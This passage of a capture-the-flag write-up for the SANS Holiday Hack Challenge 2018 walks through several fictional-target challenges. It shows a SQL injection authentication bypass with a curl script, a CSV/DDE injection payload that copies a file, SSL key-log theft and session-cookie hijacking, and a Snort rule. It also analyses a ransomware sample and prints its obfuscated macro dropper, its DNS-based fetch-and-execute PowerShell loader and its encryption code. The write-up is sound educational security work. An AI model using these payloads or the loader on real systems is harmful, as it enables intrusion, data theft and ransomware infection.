-   Using the fingerprint scanner simply sends a blank image to the server; hence the error about not recognizing a QR code.
-   The app also performs client-side, file-type verification before submitting it to the server.
- 
<img alt="Upload B64" src="../challenges/6-upload.png" /></p>
<p><img alt="Upload Binary" src="../challenges/6-upload2.png" /></p>
<p>Since the server only looks for a recognizable QR code, we don't need to worry about pasting a replacement code over the sample badge; we can just send standalone codes to the server. This ability allows us to automate the QR code creation and submission process using the following script:</p>
<pre><code class="bash">#!/bin/bash

qrencode -o q6_exploit.png &quot;$1&quot;
curl --cookie &quot;resource_id=false&quot; -X POST -F &quot;barcode=@q6_exploit.png&quot; &quot;https://scanomatic.kringlecastle.com/upload&quot;
</code></pre>

<p>This script converts a string argument into a QR code, submits it to the upload server, and reads back the server's response. Using this script, we test out various types of input to determine the backend SQL query, based on the error messages received. Inputting a single quote, however, gives us a very descriptive error message, informing us of the entire backend query, as well as what database servertype it is, a MariaDB server.</p>
<p><code>{"data":"EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1\")","request":false}</code></p>
<p>After several attempts, we begin to look into UNION injections. Surprisingly, simply setting up the query for a UNION injection attack provides us with an authentication bypass. Providing this data, <code>' UNION SELECT 'A', 'B', 'C</code>, causes the server to respond with:</p>
<p><code>{"data":"User Access Granted - Control number 19880715", "request":true, "success": {"hash" : "ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb", "resourceId":"false" }}</code></p>
<p>Research into this issue leads me to believe that the server doesn't validate the values returned by the SQL query. As long as it receives a row and that row doesn't have integer 0 as the enabled value, it'll mark the user as valid. This injected query ensures that the server receives a row with the values 'A', 'B', 'C'. Since 'C' is not a 0, the scanner allows that user through.</p>
<p>With the successful the SQL injection attack, we unlock the door to Santa's vault and receive the access control number provided by the door panel: <strong><em>19880715</em></strong></p>
<p><img alt="Successful 19880715" src="../challenges/6-good.png" /></p>
<h3 id="7-hr-incident-response">7) HR Incident Response<a class="headerlink" href="#7-hr-incident-response" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Santa uses an Elf Resources website to look for talented information security professionals. <a href="https://careers.kringlecastle.com/">Gain access to the website</a> and fetch the document <code>C:\candidate_evaluation.docx</code>. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." <em>For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>Navigating to https://careers.kringlecastle.com/ we're greeted by a job application submission form. Most notably, we're able to submit our work history within a CSV file for the company's review.</p>
<p><img alt="Elf Infosec Careers" src="../challenges/7-eicindex.png" /></p>
<p><img alt="Application Submission" src="../challenges/7-submit.png" /></p>
<p>During our enumeration of the site, we also come across the 404 page. This gave us additional information on how to potentially exfiltrate files from the machine through the <code>/public/</code> web directory.</p>
<p><img alt="404 Page" src="../challenges/7-404.png" /></p>
<p>Based on the hints provided for this challenge, it appears that we must exfiltrate the <code>candidate_evaluation.docx</code> file using a CSV injection attack. Additionally, from the message on the 404 page, we should copy the file to the publicly accessible directory, <code>C:\careerportal\resources\public\</code> in order to access it through the web application. By exploiting Excel's dynamic data exchange (DDE) functionality, we can execute operating system commands upon the victim opening the malicious CSV file. To accomplish this, we generate the malicious string using https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads, which will copy the target file into the public directory as <code>berninator.docx</code>, allowing us to download it.</p>
<pre><code class="bat">C:\Users\Bernard\Documents\Netsec\sans2018\Office-DDE-Payloads&gt;python ddeexcel.py
[-] Enter DDE payload argument #1: cmd
[-] Enter DDE payload argument #2: /c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\berninator.docx
[-] Enter DDE payload argument #3 (press ENTER to omit):
[*] Selected DDE payload: cmd|/c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\berninator.docx
[*] Inserting DDE payload into payload-final.xlsx/xl/externalLinks/externalLink1.xml...
[*] Payload generation complete! Delivery methods below:
        1. Send payload-final.xlsx directly to your target(s).
</code></pre>

<p>This generated the following payload for us to use in our <code>payload.csv</code> file.</p>
<pre><code>=cmd|'/c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\berninator.docx '!_xlbgnm.A1
</code></pre>

<p><img alt="Payload Submission" src="../challenges/7-payloadsubmit.png" /></p>
<p>Since the employees within the elf resources department received poor security training, they open every file they receive and click through every security warning. So, after a short wait, we can access the copied file through the site's public directory at <code>https://careers.kringlecastle.com/public/berninator.docx</code>.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ wget &quot;https://careers.kringlecastle.com/public/berninator.docx&quot;
--2019-01-10 21:40:21--  https://careers.kringlecastle.com/public/berninator.docx
Resolving careers.kringlecastle.com (careers.kringlecastle.com)... 35.229.118.54
Connecting to careers.kringlecastle.com (careers.kringlecastle.com)|35.229.118.54|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 363073 (355K) [application/vnd.openxmlformats-officedocument.wordprocessingml.
document]
Saving to: ‘berninator.docx’

berninator.docx                   100%[==========================================================&gt;] 354.56K  1.66MB/s    in 0.2s

2019-01-10 21:40:22 (1.66 MB/s) - ‘berninator.docx’ saved [363073/363073]
</code></pre>

<p>After viewing the secret document, we narrow down the possible candidate to "Krampus", the only one who's name begins with a 'K'. Here we discover that the terrorist organization supporting Krampus is <strong><em>Fancy Beaver</em></strong>.</p>
<blockquote>
<p>Comments (Please summarize your perceptions of the candidate’s strengths, and any concerns that should be considered:</p>
<p>Krampus’s career summary included experience hardening decade old attack vectors, and lacked updated skills to meet the challenges of attacks against our beloved Holidays.</p>
<p>Furthermore, there is intelligence from the North Pole this elf is linked to cyber terrorist organization Fancy Beaver who openly provides technical support to the villains that attacked our Holidays last year.</p>
<p>We owe it to Santa to find, recruit, and put forward trusted candidates with the right skills and ethical character to meet the challenges that threaten our joyous season.</p>
</blockquote>
<h3 id="8-network-traffic-forensics">8) Network Traffic Forensics<a class="headerlink" href="#8-network-traffic-forensics" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Santa has introduced a web-based packet capture and analysis tool at 
https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? <em>For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LACranberry Pi terminal challenge.</em></p>
</blockquote>
<p>After registering a <em>Packalyzer</em> account and logging in, we're greeted with an interface that allows us to analyze network traffic, including a function to sniff and record  traffic for 20 seconds. Our first step is to take a recording of some traffic and download the generated PCAP file and for analysis in Wireshark.</p>
<p><img alt="Control Panel" src="../challenges/8-controlpanel.png" /></p>
<p>After opening this data within Wireshark, we notice a lot of encrypted TLS packets. This prevents us from deciphering the actual data being transmitted until we can find the SSL keys.</p>
<p><img alt="Wireshark" src="../challenges/8-wireshark1.png" /></p>
<p>By analyzing the webpage in Chrome DevTools, we discover several interesting pieces of information:
-   Many of the application's supporing files are accessed on port 80 via HTTPS within a <code>pub</code> directory.
-   There exists an <code>app.js</code> file, which we currently can't see under the sources tab.</p>
<p><img alt="Source File" src="../challenges/8-sources.png" /></p>
<p>Using this information, we attempt to search for the app.js file. Although we cannot find it on the normal HTTPS port (443), we successfully find the file on port 80, in either https://packalyzer.kringlecastle.com:80/app.js or https://packalyzer.kringlecastle.com:80/pub/app.js. Analyzing <code>app.js</code> provides us with several key pieces of information about the <em>Packalyzer</em> application:
- It runs using HTTP2.
- The SSL key log file is located in <code>__dirname + process.env.DEV + process.env.SSLKEYLOGFILE</code>.</p>
<p>The log file's location is not immediately useful since it's held within ENV variables. However, by attempting to access the variable names on port 443, we notice that the application prints out the variable's actual value. This allows us to determine the log file's directory and file name (<code>/dev/packalyzer_clientrandom_ssl.log</code>) to download it for our use.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl &quot;https://packalyzer.kringlecastle.com/DEV/reveal&quot;
Error: ENOENT: no such file or directory, open '/opt/http2/dev//reveal'
bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl &quot;https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/reveal&quot;
Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/reveal'
bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl -s &quot;https://packalyzer.kringlecastle.com/dev/
packalyzer_clientrandom_ssl.log&quot; | head -n 3
CLIENT_RANDOM 812B81585E2D2748BDEAD5210275349893FE9D24E9A06A53477946562E4AD204
 98D921E75354592C4BB1FC67FD35E41EB56501C9DBA5C49A896360AD3
 AA14436675E002D17C0E1ACD5CDA38E58058B18
CLIENT_RANDOM 71BB674B0A99BAFC8EEC870A405DF93F1AD0F4845F88F89E89572C2A1FBEACDA
 EACBA6F6B87C6F9A668E25950EEF18BE00F2E9EB6C4E15DF49B730F86
 F19ADFA22322E9903CB5AD73B3518702DFE32AC
CLIENT_RANDOM 2255ECB935DC13C45B078B206F9E584322B65A191A13DF14E6A8961E10654E21
 E1F907E4DC18095442F1797EB43FDF53BD35579EE1BF0F419824E2D09
 C44E18882B59D4529CC992A56BD76410C8857F7
</code></pre>

<p>Now, by using the <em>Packalyzer</em> application and our access to the SSL key log, we can decrypt SSL traffic on the network and reveal their plaintext contents.</p>
<p><img alt="Adding the SSL Log File" src="../challenges/8-ssllogadd.png" /></p>
<p><img alt="Decrypted SSL Traffic" src="../challenges/8-wiresharkdecrypt.png" /></p>
<p>Although these packets only show requests for the <em>Packalyzer</em> application, we can still examine the headers of each request to gather cookies for us to impersonate other users. To accomplish this, we need to gather values of for the 'PASESSION' cookie.</p>
<p><img alt="PASESSION Cookies" src="../challenges/8-wiresharkpasession.png" /></p>
<p>We gather and test several of these cookies until we come across one that logs us in as 'alabaster', a user with admin privileges and a saved capture file named <code>super_secret_packet_capture.pcap</code>.</p>
<p><img alt="Changing the Cookie Value" src="../challenges/8-cookiemodify.png" /></p>
<p><img alt="Alabaster's Account" src="../challenges/8-alabasteraccount.png" /></p>
<p><img alt="The Secret Log File" src="../challenges/8-alabastersavedpcap.png" /></p>
<p>This capture file contains SMTP traffic of alabaster.snowball@mail.kringlecastle.com sending an email with an attachment to holly.evergreen@mail.kringlecastle.com, the two individuals we're concerned with for this challenge. After extracting and reading the attached pdf file, we learn that the song described by Alabaster in his communications with Holly is <strong><em>Mary Had a Little Lamb</em></strong>.</p>
<p><img alt="Alabaster's Email" src="../challenges/8-alabastersentemail.png" /></p>
<blockquote>
<p><img alt="Keyboard" src="../challenges/8-keyboard.png" /></p>
<p>A piano keyboard gives us easy access to every (western) tone. As we go from left to right, the
pitches get higher. Pressing the middle A, for example, would give us a tone of 440 Hertz.
Pressing the next A up (to the right) gives us 880 Hz, while the next one down (left) produces
220 Hz. These A tones each sound very similar to us - just higher and lower. Each A is an
“octave” apart from the next. Going key by key, we count 12 “half tone” steps between one A
and the next - 12 steps in an octave.</p>
<p>As you may have guessed, elf (and human) ears perceive pitches logarithmically. That is, the
frequency jump between octaves doubles as we go up the keyboard, and that sounds normal to
us. Consequently, the precise frequency of each note other than A can only be cleanly
expressed with a log base 12 expression. Ugh! For our purposes though, we can think of note
separation in terms of whole and half steps.</p>
<p>Have you noticed the black keys on the keyboard? They represent half steps between the white
keys. For example, the black key between C and D is called C# (c-sharp) or Db (d-flat). Going
from C to D is a whole step, but either is a half step from C#/Db. Some white keys don’t have
black ones between them. B &amp; C and E &amp; F are each only a half step apart. Why? Well, it
turns out that our ears like it that way. Try this: press C D E F G A B C on a piano. It sounds
natural, right? The “C major” scale you just played matches every other major scale:
- whole step from C to D
- whole step from D to E
- half step from E to F
- whole step from F to G
- Whole step from G to A
- Whole step from A to B, and finally
- Half step from B to C</p>
<p>If you follow that same pattern (whole whole half whole whole whole half), you can start from
any note on the keyboard and play a major scale. So a Bb major scale would be Bb C D Eb F
G A Bb. You can get this by counting whole and half steps up from Bb or by taking each note in
the C major scale and going down a whole step.</p>
<p>This uniform shifting of tones is called transposition. This is done all the time in music because
of differences in how instruments are designed, the sound an arranger wants to achieve, or the
comfortable vocal range of a singer. Some elves can do this on the fly without really thinking,
but it can always be done manually, looking at a piano keyboard.</p>
<p>To look at it another way, consider a song “written in the key of Bb.” If the musicians don’t like
that key, it can be transposed to A with a little thought. First, how far apart are Bb and A?
Looking at our piano, we see they are a half step apart. OK, so for each note, we’ll move down
one half step. Here’s an original in Bb:
D C Bb C D D D C C C D F F D C Bb C D D D D C C D C Bb</p>
<p>And take everything down one half step for A:
C# B A B C# C# C# B B B C# E E C# B A B C# C# C# C# B B C# B A</p>
<p>We’ve just taken Mary Had a Little Lamb from Bb to A!</p>
</blockquote>
<h3 id="9-ransomware-recovery">9) Ransomware Recovery<a class="headerlink" href="#9-ransomware-recovery" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. <em>For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>This challenge takes place entirely within Santa's Secret Room, beyond the door locked by the <em>Scan-O-Matic</em>.</p>
<p><img alt="Location" src="../challenges/9-location.png" /></p>
<h4 id="9a-catch-the-malware">9a) Catch the Malware<a class="headerlink" href="#9a-catch-the-malware" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle.</p>
<p>Help, all of our computers have been encrypted by ransomware!
I came here to help but got locked in 'cause I dropped my "Alabaster Snowball" badge in a rush.
I started analyzing the ransomware on my host operating system, ran it by accident, and now my files are encrypted!
Unfortunately, the password database I keep on my computer was encrypted, so now I don't have access to any of our systems.
If only there were some way I could create some kind of traffic filter that could alert anytime ransomware was found!</p>
</blockquote>
<pre><code> _  __     _             _       _____          _   _      
 | |/ /    (_)           | |     / ____|        | | | |     
 | ' / _ __ _ _ __   __ _| | ___| |     __ _ ___| |_| | ___ 
 |  &lt; | '__| | '_ \ / _` | |/ _ \ |    / _` / __| __| |/ _ \
 | . \| |  | | | | | (_| | |  __/ |___| (_| \__ \ |_| |  __/
 |_|\_\_|  |_|_|_|_|\__, |_|\___|\_____\__,_|___/\__|_|\___|
             / ____| __/ |          | |                     
            | (___  |___/  ___  _ __| |_                    
             \___ \| '_ \ / _ \| '__| __|                   
             ____) | | | | (_) | |  | |_                    
            |_____/|_|_|_|\___/|_|_  \__|                   
               |_   _|  __ \ / ____|                        
                 | | | |  | | (___                          
         _____   | | | |  | |\___ \        __               
        / ____| _| |_| |__| |____) |      /_ |              
       | (___  |_____|_____/|_____/ _ __   | |              
        \___ \ / _ \ '_ \/ __|/ _ \| '__|  | |              
        ____) |  __/ | | \__ \ (_) | |     | |              
       |_____/ \___|_| |_|___/\___/|_|     |_|              

============================================================
INTRO:
  Kringle Castle is currently under attacked by new piece of
  ransomware that is encrypting all the elves files. Your 
  job is to configure snort to alert on ONLY the bad 
  ransomware traffic.

GOAL:
  Create a snort rule that will alert ONLY on bad ransomware
  traffic by adding it to snorts /etc/snort/rules/local.rules
  file. DNS traffic is constantly updated to snort.log.pcap

COMPLETION:
  Successfully create a snort rule that matches ONLY
  bad DNS traffic and NOT legitimate user traffic and the 
  system will notify you of your success.

  Check out ~/more_info.txt for additional information.

elf@c59a963b51a3:~$ cat more_info.txt
MORE INFO:
  A full capture of DNS traffic for the last 30 seconds is 
  constantly updated to:

  /home/elf/snort.log.pcap

  You can also test your snort rule by running:

  snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf

  This will create an alert file at ~/snort_logs/alert

  This sensor also hosts an nginx web server to access the 
  last 5 minutes worth of pcaps for offline analysis. These 
  can be viewed by logging into:

  http://snortsensor1.kringlecastle.com/

  Using the credentials:
  ----------------------
  Username | elf
  Password | onashelf

  tshark and tcpdump have also been provided on this sensor.

HINT: 
  Malware authors often user dynamic domain names and 
  IP addresses that change frequently within minutes or even 
  seconds to make detecting and block malware more difficult.
  As such, its a good idea to analyze traffic to find patterns
  and match upon these patterns instead of just IP/domains.
</code></pre>

<p>After downloading a current capture file, we conduct our analysis and determine several key traits regarding the malicious traffic:
-   It's performed over DNS
-   It often involves a subdomain containing a hex-encoded string, in this case for "wannacookie.min.ps1".
-   It sometimes includes a sequence of subsubdomain requests for numbers incrementing from 0.
-   The domain name always has a permutation of the word "hans gruber".
-   The top-level domain varies between many different possibilities.
- 
<img alt="Traffic Analysis" src="../challenges/9a-wireshark.png" /></p>
<p>There are many various ways to filter out the malicious traffic based on these factors. Here, we will filter out all domain names that contain a ten-character long word that only uses the letters from 'hans gruber'. After modifying our local.rules file, it will look like this:</p>
<pre><code class="bash"># $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert udp any any -&gt; any 53 ( msg:&quot;Potential Hans CnC Traffic&quot;;pcre:&quot;/[hansgruber]{10}/&quot;; sid:666; rev:1; )
alert udp any 53 -&gt; any any ( msg:&quot;Potential Hans CnC Traffic&quot;;pcre:&quot;/[hansgruber]{10}/&quot;; sid:667; rev:1; )
</code></pre>

<p>After saving the snort rule, it now gives an alert for all ransomware CnC traffic.</p>
<pre><code>elf@b6e71d54c2b0:~$ nano /etc/snort/rules/local.rules
elf@b6e71d54c2b0:~$ 
[+] Congratulation! Snort is alerting on all ransomware and only the ransomware! 
[+] 
</code></pre>

<h4 id="9b-identify-the-domain">9b) Identify the Domain<a class="headerlink" href="#9b-identify-the-domain" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Using the Word docm file, identify the domain name that the malware communicates with.</p>
<p>Thank you so much! Snort IDS is alerting on each new ransomware infection in our network.
Hey, you're pretty good at this security stuff. Could you help me further with what I suspect is a malicious Word document?
All the elves were emailed a cookie recipe right before all the infections. Take this document with a password of elves and find the domain it communicates with.</p>
</blockquote>
<p>The document itself seems fairly innocuous at first, containing only the recipe for chocolate chip cookies. However, by extracting the VBA macros embedded within the file, we can see the malicious intent behind it.</p>
<p><img alt=".docm File" src="../challenges/9b-docm.png" /></p>
<p>To extract the macros from the document, we will use <code>olevba</code> from the <code>python-oletools</code> package. Initially, we find that it's encoded using Base64, in what looks like an attempt to obfuscate the script.</p>
<pre><code>C:\Users\Bernard\Documents\Netsec\sans2018&gt;olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm
olevba 0.53.1 - http://decalage.info/python/oletools
[...snip...]
Private Sub Document_Open()
Dim cmd As String

===================================================================
cmd = &quot;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &quot;&quot;
sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream
([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoW
kxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/
AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixd
r5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRj
gC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakE
b+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9
gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]
::ASCII)).ReadToEnd()&quot;&quot; &quot;
Shell cmd
End Sub
[...snip...]
</code></pre>

<p>In order to discover the true script, we remove <code>iex</code> from the command to prevent it from executing the underlying, malicious code, and then let <em>PowerShell</em> decode the script for us. Here we can see that the trojan communicates with the domain name <strong><em>erohetfanu.com</em></strong>.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; sal a New-Object; (a 
IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::
FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToX
T7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiB
sfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSo
pCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM
7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSz
ZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.
CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()

function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; iex($(H2A $h | Out-string))
</code></pre>

<h4 id="9c-stop-the-malware">9c) Stop the Malware<a class="headerlink" href="#9c-stop-the-malware" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Identify a way to stop the malware in its tracks!</p>
<p>Erohetfanu.com, I wonder what that means? Unfortunately, Snort alerts show multiple domains, so blocking that one won't be effective.
I remember another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections.
Perhaps there is a mechanism like that in this ransomware? Do some more analysis and see if you can find a fatal flaw and activate it!</p>
</blockquote>
<p>Similar to the first de-obfuscation step, we remove <code>iex</code> from the <em>PowerShell</em> command to further deobfuscate this code. Due to the length of the returned output, we simply write the code to <code>wannacookie.min.ps1</code>, which is what the hex-string <code>77616E6E61636F6F6B69652E6D696E2E707331</code> translates to.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; ($(H2A $h | Out-string)) &gt; wannacookie.min.ps1
</code></pre>

<p>This retrieves a minified version of the ransomware's code. Although we can still reverse engineer the code with what we have, we attempt to retrieve the non-minified version by performing a request for <code>wannacookie.ps1</code>, or <code>77616e6e61636f6f6b69652e707331</code>, using the modified code.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &quot;77616e6e61636f6f6b69652e707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; ($(H2A $h | Out-string)) &gt; wannacookie.ps1
</code></pre>

<p>By analyzing the deobfuscated ransomware script, we notice an interesting code block at the beginning of the main wannacookie function.</p>
<pre><code class="powershell">$S1 = &quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000
cdd5c5c10000000&quot;

if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return}

if ($(netstat -ano | Select-String &quot;127.0.0.1:8080&quot;).length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne &quot;KRINGLECASTLE&quot;) {return}
</code></pre>

<p>Several things make these statements interesting:
-   They are if-statements that end the script if the condition is true.
-   They are located at the beginning of the main, wannacookie function, giving them a chance to stop any malicious activity if triggered.
-   The hex value <code>6B696C6C737769746368</code> from the subdomain in the first statement translates to <code>killswitch</code>.
-   The second statement halts execution if the host machine doesn't live on the <code>KRINGLECASTLE</code> domain. This gives evidence that it's an attack that directly targets Santa's network.</p>
<p>Like the previous deobfuscation techniques, we remove any potentially damaging code from the code block, modify it to output the desired information, and run it within PowerShell to see the decoded output. Another step for this particular challenge is that we much also import the various functions the "killswitch" method makes use of in order for the decoding process to work.</p>
<p>After analyzing the various nested functions, we can determine that the killswitch method decodes the domain by simply using an XOR decryption between <code>1f0f0202171d020c0b09075604070a0a</code> and the data retrieved from the CnC server, which is <code>66667272727869657268667865666B73</code> in this case. The full explaination can be found in the <em>Wannacookie Malware Analysis</em> appendix.</p>
<p>Our final code and output, sans the importing, is seen below.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; $S1 = &quot;1f8b08000000
0000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;
&gt;&gt; $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))

yippeekiyaa.aaay
</code></pre>

<p>Based on this output, we can determine that the killswitch domain used by Wannacookie is: <strong><em>yippeekiyaa.aaay</em></strong>
We are able to confim this through the Ho Ho Ho Daddy application.</p>
<p><img alt="Ho Ho Ho Daddy" src="../challenges/9c-hohohodaddy.png" /></p>
<p><img alt="Domain Registered" src="../challenges/9c-domainregister.png" /></p>
<p>Now by registering this domain name, any victim connected to Internet during the infection process will successfully resolve <em>yippeekiyaa.aaay</em>, saving them from potential damage.</p>
<h4 id="9d-recover-alabasters-password">9d) Recover Alabaster's Password<a class="headerlink" href="#9d-recover-alabasters-password" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Recover Alabaster's password as found in the the encrypted password vault.</p>
<p>Yippee-Ki-Yay! Now, I have a ma... kill-switch!
Now that we don't have to worry about new infections, I could sure use your L337 security skills for one last thing.
As I mentioned, I made the mistake of analyzing the malware on my host computer and the ransomware encrypted my password database.
Take this <a href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip">zip</a> with a memory dump and my encrypted password database, and see if you can recover my passwords.
One of the passwords will unlock our access to the vault so we can get in before the hackers.</p>
</blockquote>
<p>Immediately following the killswitch and target verification functions, we see the ransomware's file encryption procedure. It first creates and sends back the encryption key by downloading the CnC server's public key via DNS (<code>server.crt</code>), generating a random, 256-bit AES encryption key, and sending that back to the server after encrypting the key using their public key. Afterwards, it encrypts the all <code>.elfdb</code> files on the machine using that key. Finally, it clears the <code>Hex_key</code> and <code>Byte_key</code> variables, reducing the chances for us to find the unencrypted keys within memory. However, the public key encrypted key may still be found.</p>
<p>The full analysis of this section can be read in the <em>Wannacookie Malware Analysis</em> appendix.</p>
<pre><code class="powershell">$pub_key = [System.Convert]::FromBase64String($(get_over_dns(
&quot;7365727665722E637274&quot;) ) )
$Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]
([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
$Hex_key = $(B2H $Byte_key)
$Key_Hash = $(Sha1 $Hex_key)
$Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
$cookie_id = (send_key $Pub_key_encrypted_Key)
$date_time = (($(Get-Date).ToUniversalTime() | Out-String) -replace &quot;`r`n&quot;)
[array]$future_cookies = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),  
     $($env:userprofile+'\Documents'),$($env:userprofile+'\Videos')
     ,$($env:userprofile+'\Pictures'),
     $($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
enc_dec $Byte_key $future_cookies $true
Clear-variable -Name &quot;Hex_key&quot;
Clear-variable -Name &quot;Byte_key&quot;
</code></pre>

<p>Similar to previous methods, we import all associated functions, remove all malicious code, and run this script within our own <em>PowerShell</em> terminal to discern the output of this script. Since the information that we're interested in is how the keys look within memory, we run this code block up until line 5, where it encrypts the AES key using the public key.</p>
<pre><code class="powershell">PS C:\Users\Bernard\Documentss\Netsec\sans2018&gt; $pub_key = [System.Convert]::FromBase64String($(get_over_dns(
&quot;7365727665722E637274&quot;) ) )
&gt;&gt; $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes(
$(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
&gt;&gt; $Hex_key = $(B2H $Byte_key)
&gt;&gt; $Key_Hash = $(Sha1 $Hex_key)
&gt;&gt; $Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
&gt;&gt;
PS C:\Users\Bernard\Documents\Netsec\sans2018&gt; echo $Hex_key
c5f328393f9fab2ffcdb4f924738644d
